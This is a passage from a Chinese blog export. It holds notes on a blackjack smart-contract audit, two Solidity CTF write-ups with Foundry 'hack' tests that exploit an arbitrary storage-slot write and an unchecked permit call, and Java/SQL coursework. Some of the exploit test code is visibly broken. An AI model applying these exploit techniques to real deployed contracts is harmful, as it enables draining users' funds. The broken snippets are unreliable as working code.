（高）</h1><p>我感觉这是合约的功能实现问题了。就没有玩家如果输了。那么转账就该给庄家。但是合约并没有实现。所以就出现了资金锁定的问题<br>重点就是这个结束游戏的函数实现，部分代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (playerWon) &#123;</span><br><span class="line">           payable(player).transfer(2 ether); // 将奖励转账给玩家</span><br><span class="line">           emit FeeWithdrawn(player, 2 ether); // 触发奖励提取事件</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>可以发现，只有给玩家转账，但是没有给庄家的转账</p><h1 id="开始游戏是返回的是玩家的手牌（其实这一个漏洞其实我并不认可。）（高）"><a href="#开始游戏是返回的是玩家的手牌（其实这一个漏洞其实我并不认可。）（高）" class="headerlink" title="开始游戏是返回的是玩家的手牌（其实这一个漏洞其实我并不认可。）（高）"></a>开始游戏是返回的是玩家的手牌（其实这一个漏洞其实我并不认可。）（高）</h1><p>看他的报告。我认为这和漏洞是没有必要的，而且这个合约本来就很矛盾，没有初始化的金额。然后这个漏洞又是基于合约中由大量的金额才能实施，先来看看他是怎么说的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TwentyOne.sol 合约中的 startGame() 函数返回玩家的初始手牌值作为 uint256。这使得攻击者能够通过回滚不利的交易，确保只在获得有利手牌的情况下继续游戏，从而操控游戏玩法。攻击者可以利用一个定制的攻击合约，轻松地耗尽合约中的资金，而损失极小。</span><br><span class="line"></span><br><span class="line">漏洞详情</span><br><span class="line">根本原因</span><br><span class="line">漏洞存在于 startGame() 函数中，该函数将玩家的初始手牌值作为返回值暴露。这种设计缺陷使得攻击者能够通过检查返回的值，选择性地回滚不利的交易。</span><br><span class="line"></span><br><span class="line">利用过程</span><br><span class="line">初始化： 攻击者部署并为恶意合约 AttackTwentyOne.sol 提供资金，恶意合约与 TwentyOne.sol 合约进行交互。</span><br><span class="line"></span><br><span class="line">选择性执行： 攻击合约调用 startGame()，检查返回的手牌值（playerHand），如果该值低于预定义的阈值（例如 20），则回滚交易。</span><br><span class="line"></span><br><span class="line">确保优势： 只有当攻击者的手牌值足够高时，交易才会继续，从而确保攻击者具有极高的获胜几率。</span><br><span class="line"></span><br><span class="line">耗尽合约资金： 攻击者通过这种方式持续进行操作，直到目标合约的余额被耗尽。</span><br><span class="line"></span><br><span class="line">function startGame() public payable returns (uint256) &#123;</span><br><span class="line">    require(</span><br><span class="line">        address(this).balance &gt;= 2 ether,</span><br><span class="line">        &quot;Not enough ether on contract to start game&quot;</span><br><span class="line">    );</span><br><span class="line">    address player = msg.sender;</span><br><span class="line">    require(msg.value == 1 ether, &quot;start game only with 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">    initializeDeck(player);</span><br><span class="line"></span><br><span class="line">    uint256 card1 = drawCard(player);</span><br><span class="line">    uint256 card2 = drawCard(player);</span><br><span class="line">    addCardForPlayer(player, card1);</span><br><span class="line">    addCardForPlayer(player, card2);</span><br><span class="line">    return playersHand(player); // 暴露游戏状态</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人认为，这个是游戏的开始才能调用的函数，而且还要初始化player,那么攻击者的调用就没有意义。而且攻击者要成功的调用这个startGame函数，查看玩家的手牌，那么还要发送一个1 ether，攻击者赢得游戏也才2 ether,攻击者还要使用1 ehter去开启游戏，所以这个是得不偿失的存在，虽然这个问题是存在的，但是我认为攻击者没有收益去这么做</p><h1 id="平局判玩家输，不符合规定21点的游戏规则-（中）"><a href="#平局判玩家输，不符合规定21点的游戏规则-（中）" class="headerlink" title="平局判玩家输，不符合规定21点的游戏规则 （中）"></a>平局判玩家输，不符合规定21点的游戏规则 （中）</h1><p>这个就是纯游戏理解规则了，最开始我也了解了21点的游戏规则，但是后来我认为这个应该是合约这么设定的，就是由平局就是庄家胜，结果者居然是个漏洞，不可思议吗，这是漏洞代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (dealerHand &gt; 21) &#123;</span><br><span class="line">    emit PlayerWonTheGame(&quot;Dealer went bust, players winning hand: &quot;, playerHand);</span><br><span class="line">    endGame(msg.sender, true);</span><br><span class="line">&#125; else if (playerHand &gt; dealerHand) &#123;</span><br><span class="line">    emit PlayerWonTheGame(&quot;Dealer&#x27;s hand is lower, players winning hand: &quot;, playerHand);</span><br><span class="line">    endGame(msg.sender, true);</span><br><span class="line">&#125; else &#123;  // 这个 else 块错误地将平局处理为玩家的失败</span><br><span class="line">    emit PlayerLostTheGame(&quot;Dealer&#x27;s hand is higher, dealers winning hand: &quot;, dealerHand);</span><br><span class="line">    endGame(msg.sender, false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="庄家的爆牌概率很高-（中）"><a href="#庄家的爆牌概率很高-（中）" class="headerlink" title="庄家的爆牌概率很高 （中）"></a>庄家的爆牌概率很高 （中）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">概述</span><br><span class="line">TwentyOne 合约中的庄家手牌随机逻辑导致庄家超出21点（爆牌）的概率较高（超过50%）。从长期来看，玩家将能够赢取合约中的所有ETH。</span><br><span class="line"></span><br><span class="line">漏洞详情</span><br><span class="line">庄家手牌的阈值（standThreshold）是基于一个随机数来决定的，该随机数通过对 block.timestamp、msg.sender 和 block.prevrandao 进行哈希处理后，对5取模，并加上17，得出庄家停止抽牌的阈值。</span><br><span class="line"></span><br><span class="line">TwentyOne.sol</span><br><span class="line"></span><br><span class="line">solidity</span><br><span class="line">复制代码</span><br><span class="line">uint256 standThreshold = (uint256(</span><br><span class="line">    keccak256(</span><br><span class="line">        abi.encodePacked(block.timestamp, msg.sender, block.prevrandao)</span><br><span class="line">    )</span><br><span class="line">) % 5) + 17;</span><br><span class="line">从上面的代码可以看出，standThreshold 有5个可能的值：&#123;17, 18, 19, 20, 21&#125;。</span><br><span class="line"></span><br><span class="line">庄家需要抽取卡片，直到手牌的点数达到该随机阈值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>个人认为这也是一个矛盾的点。审计开始的时候还说了用随机性来处理庄家的代码手牌，结果这样是个漏洞，确实导致了游戏的不公平进行</p><h1 id="还有一些其他的低问题，就不说了"><a href="#还有一些其他的低问题，就不说了" class="headerlink" title="还有一些其他的低问题，就不说了"></a>还有一些其他的低问题，就不说了</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Storage</title>
      <link href="/2024/12/02/CTF-Storage/"/>
      <url>/2024/12/02/CTF-Storage/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Storeage"><a href="#CTF-Storeage" class="headerlink" title="CTF-Storeage"></a>CTF-Storeage</h1><p>题目代码又俩个：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./StorageSlot.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Storage1 &#123;</span><br><span class="line">    uint256 public constant VERSION = 1;</span><br><span class="line">    address public aaaaa;</span><br><span class="line">    address public admin;</span><br><span class="line">    bytes32 public constant OPERATOR_ROLE = keccak256(&quot;OPERATOR_ROLE&quot;);</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public gasDeposits;</span><br><span class="line"></span><br><span class="line">    event SendFlag();</span><br><span class="line">    event SetLogicContract(bytes32 key, address oldAddress, address newAddress);</span><br><span class="line">    event DepositedGas(address account, uint256 amount);</span><br><span class="line">    event WithdrewGas(address account, uint256 amount);</span><br><span class="line"></span><br><span class="line">    error ZeroValue();</span><br><span class="line">    error ZeroAmount();</span><br><span class="line">    error NoAccess(bytes32 roleid, address account);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        admin = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin() &#123;</span><br><span class="line">        require(admin == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置任意slot内容</span><br><span class="line">    function setLogicContract(bytes32 key, address contractAddress) external &#123;</span><br><span class="line">        StorageSlot.AddressSlot storage slot = StorageSlot.getAddressSlot(key);</span><br><span class="line">        emit SetLogicContract(key, slot.value, contractAddress);</span><br><span class="line">        slot.value = contractAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款：给某个账户存款</span><br><span class="line">    function depositGasFor(address account) external payable &#123;</span><br><span class="line">        depositGas(account, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">    function depositGas(address account, uint256 amount) internal &#123;</span><br><span class="line">        if (amount == 0) revert ZeroValue();</span><br><span class="line">        gasDeposits[account] = gasDeposits[account] + amount;</span><br><span class="line">        emit DepositedGas(account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 取款</span><br><span class="line">    function withdrawGas(uint256 amount) external &#123;</span><br><span class="line">        if (amount == 0) revert ZeroAmount();</span><br><span class="line"></span><br><span class="line">        uint256 withdrawAmount = amount &gt; gasDeposits[msg.sender] ? gasDeposits[msg.sender]: amount;</span><br><span class="line"></span><br><span class="line">        if (withdrawAmount == 0) return;</span><br><span class="line"></span><br><span class="line">        gasDeposits[msg.sender] = gasDeposits[msg.sender] - withdrawAmount;</span><br><span class="line">        payable(msg.sender).transfer(withdrawAmount);</span><br><span class="line"></span><br><span class="line">        emit WithdrewGas(msg.sender, withdrawAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public  &#123;</span><br><span class="line">        require(admin == msg.sender);</span><br><span class="line">        require(gasDeposits[msg.sender] &gt;= 9999999999999999999999999999999999);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        depositGas(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v4.7.0) (utils/StorageSlot.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Library for reading and writing primitive types to specific storage slots.</span><br><span class="line"> *</span><br><span class="line"> * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.</span><br><span class="line"> * This library helps with reading and writing to such slots without the need for inline assembly.</span><br><span class="line"> *</span><br><span class="line"> * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.</span><br><span class="line"> *</span><br><span class="line"> * Example usage to set ERC1967 implementation slot:</span><br><span class="line"> * ```</span><br><span class="line"> * contract ERC1967 &#123;</span><br><span class="line"> *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"> *</span><br><span class="line"> *     function _getImplementation() internal view returns (address) &#123;</span><br><span class="line"> *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;</span><br><span class="line"> *     &#125;</span><br><span class="line"> *</span><br><span class="line"> *     function _setImplementation(address newImplementation) internal &#123;</span><br><span class="line"> *         require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line"> *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class="line"> *     &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> * ```</span><br><span class="line"> *</span><br><span class="line"> * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._</span><br><span class="line"> */</span><br><span class="line">library StorageSlot &#123;</span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct BooleanSlot &#123;</span><br><span class="line">        bool value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Bytes32Slot &#123;</span><br><span class="line">        bytes32 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Uint256Slot &#123;</span><br><span class="line">        uint256 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题也是属于签到题了。就是考了一个slot的概念吧，一个slot储存是占32字节的，对于mapping映射来说，那么就是使用哈希函数来计算的，比如：<br>对于一个mapping映射，（address-&gt;uint256）此时它的slot 表面是4，实际它是通过slot&#x3D;keccak(encodePacked(address,uint256(4)));来计算的<br>这也就是我们这个的余额计算的步骤</p><p>通过分析可以知道;<br>admid是占slot[3];<br>balance是占slot<a href="%E5%AE%9E%E9%99%85%E6%98%AF%E9%80%9A%E8%BF%87%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E8%AE%A1%E7%AE%97">4</a></p><p>那么我们就可以直接调用setLogicContract函数去更改对应的储槽位就可以了，<br>测试函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;forge-std/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &quot;src/StorageSlot.sol&quot;;</span><br><span class="line">import &quot;src/Storage1.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack is Test&#123;</span><br><span class="line">   Storage1 storage1;</span><br><span class="line"></span><br><span class="line">   function setUp() public &#123;</span><br><span class="line">    storage1 = new Storage1();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function test_Storage1() public &#123;</span><br><span class="line">      storage1.setLogicContract(bytes32(uint256(3)),address(this));</span><br><span class="line">       bytes32 slot = keccak256(abi.encodePacked(address(this), uint256(4)));</span><br><span class="line">      storage1.setLogicContract(slot,address(9999999999999999999999999999999999));</span><br><span class="line">assertTrue(storage1.isComplete(), &quot;The storage is not complete&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-LostAssert</title>
      <link href="/2024/12/02/CTF-LostAssert/"/>
      <url>/2024/12/02/CTF-LostAssert/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-LostAssert"><a href="#CTF-LostAssert" class="headerlink" title="CTF-LostAssert"></a>CTF-LostAssert</h1><p>这道题我感觉属于签到题了。就是分清包装代币，s代币，原生代币的关系</p><p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.26;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Permit, ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 普通的ERC20代币</span><br><span class="line">contract MockWETH is ERC20(&quot;Wrapped ETH&quot;, &quot;WETH&quot;) &#123;</span><br><span class="line">    event Deposit(address indexed dst, uint256 wad);</span><br><span class="line">    event Withdrawal(address indexed src, uint256 wad);</span><br><span class="line"></span><br><span class="line">    /// @dev Original WETH9 implements `fallback` function instead of `receive` function due to a earlier solidity version</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        deposit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        _mint(msg.sender, msg.value);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 wad) public &#123;</span><br><span class="line">        require(balanceOf(msg.sender) &gt;= wad, &quot;weth: insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        _burn(msg.sender, wad);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: wad&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;weth: failed&quot;);</span><br><span class="line"></span><br><span class="line">        emit Withdrawal(msg.sender, wad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 本身也是一个ERC20代币，并且拥有Permit功能</span><br><span class="line">// 并且添加了一个普通的ERC20代币作为underlyingToken</span><br><span class="line">contract MocksWETH is ERC20Permit &#123;</span><br><span class="line">    using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">    address underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address _underlying) ERC20(&quot;WrappedERC20&quot;, &quot;WERC20&quot;) ERC20Permit(&quot;WrappedERC20&quot;)&#123;</span><br><span class="line">        underlying = _underlying;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将资产从WETH换成sWETH</span><br><span class="line">    function deposit() external returns (uint256) &#123;</span><br><span class="line">        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);</span><br><span class="line">        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        return _deposit(_amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(uint256 amount) external returns (uint256) &#123;</span><br><span class="line">        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);</span><br><span class="line">        return _deposit(amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 链下签名： 将资产从WETH换成sWETH</span><br><span class="line">    function depositWithPermit(</span><br><span class="line">        address target,</span><br><span class="line">        uint256 value,</span><br><span class="line">        uint256 deadline,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256) &#123;</span><br><span class="line">        // underlying即WETH，没有这个方法，因此去到fallback()而不会检验，相当于啥也没写</span><br><span class="line">        IERC20Permit(underlying).permit(target,address(this),value,deadline, v,r,s);</span><br><span class="line">        // 因为有个已经执行过的操作：      WETH资产：LostAssets 授权给 sWETH合约</span><br><span class="line">        // 因此sWETH合约可以用transferFrom()来操作 LostAssets 的WETH资产</span><br><span class="line">        // 因为上面的代码形同虚设，因此任何人都可以使用此方法</span><br><span class="line">        IERC20(underlying).safeTransferFrom(target, address(this), value);</span><br><span class="line">        return _deposit(value, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deposit(uint256 value, address to) internal returns (uint256) &#123;</span><br><span class="line">        _mint(to, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 烧掉sWETH，换成WETH</span><br><span class="line">    function withdraw() external returns (uint256) &#123;</span><br><span class="line">        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external returns (uint256) &#123;</span><br><span class="line">        return _withdraw(msg.sender, amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _withdraw(address from,uint256 amount,address to) internal returns (uint256) &#123;</span><br><span class="line">        _burn(from, amount);</span><br><span class="line">        IERC20(underlying).safeTransfer(to, amount);</span><br><span class="line">        return amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LostAssets &#123;</span><br><span class="line">    MockWETH public WETH;</span><br><span class="line">    MocksWETH public sWETH;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;At least 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">        WETH = new MockWETH();</span><br><span class="line">        sWETH = new MocksWETH(address(WETH));</span><br><span class="line"></span><br><span class="line">        // WETH资产：LostAssets获得msg.value的WETH</span><br><span class="line">        WETH.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        // WETH资产：LostAssets 授权给 sWETH合约</span><br><span class="line">        WETH.approve(address(sWETH), type(uint256).max);</span><br><span class="line">        // sWETH: LostAssets 将资产从WETH换成sWETH</span><br><span class="line">        // 因为msg.sender是 LostAssets ，因此可以操作成功</span><br><span class="line">        // 这里已经操作了一半的资产，因此还有0.5ether可以操作</span><br><span class="line">        sWETH.deposit(msg.value / 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将LostAssets合约的WETH设置为0</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        require(WETH.balanceOf(address(this)) == 0);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于这个LostAssert合约已经给sWTH授予权限了，而且已经消耗了0.5个WETH，所以我们就直接调用depositWithPermit 函数，将剩下的WETH换为sWETH</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.26;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;forge-std/console.sol&quot;; </span><br><span class="line">import &quot;src/LostAsset.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    MockWETH WETH;</span><br><span class="line">    MocksWETH sweth;</span><br><span class="line">    LostAssets lostassets;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        weth = new MockWETH();</span><br><span class="line">        sweth = new MocksWETH();</span><br><span class="line">        lostassets = new LostAssets(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_LostAssets() public &#123;</span><br><span class="line">        sweth.depositWithPermit(lostassets,0.5,1000,1,0x00,0x00,address(this));</span><br><span class="line">       assertEq(lostassets.isComplete(),ture);</span><br><span class="line">     console.log(&quot;The balance LostAssert is&quot;,WETH.balanceOf(lostassets));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java课程设计_数据库代码</title>
      <link href="/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-Java课程设计代码date-2024-12-02-03-03-51tags-java"><a href="#title-Java课程设计代码date-2024-12-02-03-03-51tags-java" class="headerlink" title="title: Java课程设计代码date: 2024-12-02 03:03:51tags: java"></a>title: Java课程设计代码<br>date: 2024-12-02 03:03:51<br>tags: java</h2><h2 id="数据库设计代码"><a href="#数据库设计代码" class="headerlink" title="数据库设计代码"></a>数据库设计代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//创建数据库</span><br><span class="line">create database Student;</span><br><span class="line">use student;</span><br><span class="line">//创建学生信息表</span><br><span class="line">create table student(</span><br><span class="line">    stuid1 char(20) unique comment &#x27;学号&#x27;,</span><br><span class="line">    name char(20)  comment &#x27;姓名&#x27;,</span><br><span class="line">    telenumber int comment &#x27;电话号码&#x27;,</span><br><span class="line">    qqmail char(20) comment &#x27;邮箱&#x27;,</span><br><span class="line">    classnumber char (20) comment &#x27;班级&#x27;</span><br><span class="line">)comment&#x27;学生信息表&#x27;;</span><br><span class="line"></span><br><span class="line">//插入学生信息</span><br><span class="line">insert into student (stuid1,name,telenumber,qqmail,classnumber ) values</span><br><span class="line">    (&#x27;2023131051&#x27; ,&#x27;何圆&#x27;,123456,&#x27;123456@qq.com&#x27;,&#x27;区块链232班&#x27;),</span><br><span class="line">    (&#x27;2023131041&#x27;,&#x27;洪汇淇&#x27;,123456,&#x27;123456@qq.com&#x27;,&#x27;区块链232班&#x27;),</span><br><span class="line">    (&#x27;2023131043&#x27;,&#x27;成璐&#x27;,123456,&#x27;123456@qq.com&#x27;,&#x27;区块链232班&#x27;);</span><br><span class="line">select * from student ;</span><br><span class="line"></span><br><span class="line">//创建学生成绩表</span><br><span class="line">CREATE TABLE studentgrade (</span><br><span class="line">    stuid2 char(20) COMMENT &#x27;学号&#x27;,</span><br><span class="line">    name CHAR(20) COMMENT &#x27;姓名&#x27;,</span><br><span class="line">    math INT COMMENT &#x27;高数&#x27;,</span><br><span class="line">    MaYuan INT COMMENT &#x27;马原&#x27;,</span><br><span class="line">    English INT COMMENT &#x27;英语&#x27;,</span><br><span class="line">    linemath INT COMMENT &#x27;线性代数&#x27;</span><br><span class="line"></span><br><span class="line">) COMMENT &#x27;学生成绩表&#x27;;</span><br><span class="line"></span><br><span class="line">//插入学生成绩</span><br><span class="line">INSERT INTO studentgrade (stuid2, name, math, MaYuan, linemath, English) VALUES</span><br><span class="line">    (&#x27;2023131051&#x27;, &#x27;何圆&#x27;, 94, 83, 87, 78)</span><br><span class="line">    (&#x27;2023131041&#x27;, &#x27;洪汇淇&#x27;, 95, 82, 80, 92),</span><br><span class="line">    (&#x27;2023131043&#x27;, &#x27;成璐&#x27;, 91, 87, 84, 97);</span><br><span class="line">SELECT * FROM studentgrade;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java</title>
      <link href="/2024/12/02/Java/"/>
      <url>/2024/12/02/Java/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java课程设计代码</title>
      <link href="/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Java代码"><a href="#Java代码" class="headerlink" title="Java代码"></a>Java代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.swing.JButton;</span><br><span class="line">import javax.swing.JFrame;</span><br><span class="line">import javax.swing.JLabel;</span><br><span class="line">import javax.swing.JPanel;</span><br><span class="line">import javax.swing.JPasswordField;</span><br><span class="line">import javax.swing.JTextField;</span><br><span class="line">import javax.swing.*;</span><br><span class="line">import java.awt.*;</span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import javax.swing.table.DefaultTableModel;</span><br><span class="line">import org.jfree.chart.*;</span><br><span class="line">import org.jfree.chart.plot.*;</span><br><span class="line">import org.jfree.data.category.DefaultCategoryDataset;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.text.DecimalFormat;</span><br><span class="line"></span><br><span class="line">// 主类</span><br><span class="line">public class student &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建 JFrame 实例</span><br><span class="line">        JFrame frame = new JFrame(&quot;Login Example&quot;);</span><br><span class="line">        // Setting the width and height of frame</span><br><span class="line">        frame.setSize(350, 200);</span><br><span class="line">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line"></span><br><span class="line">        /* 创建面板，这个类似于 HTML 的 div 标签</span><br><span class="line">         * 我们可以创建多个面板并在 JFrame 中指定位置</span><br><span class="line">         * 面板中我们可以添加文本字段，按钮及其他组件。</span><br><span class="line">         */</span><br><span class="line">        